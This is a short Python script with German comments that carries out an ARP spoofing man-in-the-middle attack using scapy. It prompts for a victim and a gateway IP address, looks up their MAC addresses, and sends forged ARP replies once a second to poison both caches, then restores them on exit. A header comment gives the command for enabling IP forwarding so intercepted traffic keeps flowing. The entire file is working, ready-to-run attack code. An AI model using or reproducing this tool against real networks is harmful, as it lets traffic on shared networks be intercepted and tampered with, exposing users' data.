## Autor: Niklas Tögel
## ip forwarding aktivieren: MacOS -> sudo sysctl -w net.inet.ip.forwarding=1

from scapy.all import Ether, ARP, srp, send
import time

def mac_addr(ip): ## Returned die MAC-Adresse eines Geräts mit bestimmter IP
    mac, _ = srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=ip), timeout=3)
    if mac:
        return mac[0][1].src

def spoof(victim_ip, victim_mac, gateway_ip): ##Erzeugt und sendet ARP-Pakete um Cache zu manipulieren
    arp_response = ARP(pdst=victim_ip, hwdst=victim_mac, psrc=gateway_ip, op=2)
    send(arp_response)

def unspoof(victim_ip, victim_mac, gateway_ip, gateway_mac): ##Erzeugt und sendet ARP-Pakete um Ursprungszustand des Caches wiederherzustellen
    arp_response = ARP(pdst=victim_ip, hwdst=victim_mac, psrc=gateway_ip, hwsrc=gateway_mac, op=2)
    send(arp_response, count=3)

if __name__ == "__main__":
    
    ## Eingabe der IP-Adressen von Opfer und Router und Herausfinden von zugehörigen MAC-Adressen
    victim_ip = input("Victim IP Address? ")
    gateway_ip = input("Gateway IP Address? ")
    victim_mac = mac_addr(victim_ip)
    gateway_mac = mac_addr(gateway_ip)
    
    print("Starting Spoof, press CTRL+C to unspoof.")
    try:
        while True: ##Durchführung des Angriffs
            spoof(victim_ip, victim_mac, gateway_ip)
            spoof(gateway_ip, gateway_mac, victim_ip)
            time.sleep(1)

    except KeyboardInterrupt: ##Wiederherstellen des Caches nach Beenden des Angriffs
        print("CTRL+C detected")
        unspoof(victim_ip, victim_mac, gateway_ip, gateway_mac)
        unspoof(gateway_ip, gateway_mac, victim_ip, victim_mac)
